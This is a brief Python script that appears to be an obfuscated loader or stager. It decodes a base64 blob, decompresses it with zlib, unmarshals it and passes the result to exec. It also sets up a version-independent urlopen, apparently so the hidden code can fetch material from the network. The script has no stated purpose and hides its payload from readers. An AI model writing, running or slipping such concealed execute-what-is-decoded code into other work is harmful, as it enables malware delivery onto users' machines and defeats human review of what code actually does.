import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJz7ZV5alJNfkJqnoZ5RUlJgpa9vaKBnoGekZ2hqZWhsbKGvX1ySmJ5aVKyfEZWsV1CprqlXlJqYoqEJAB1REcc=')))))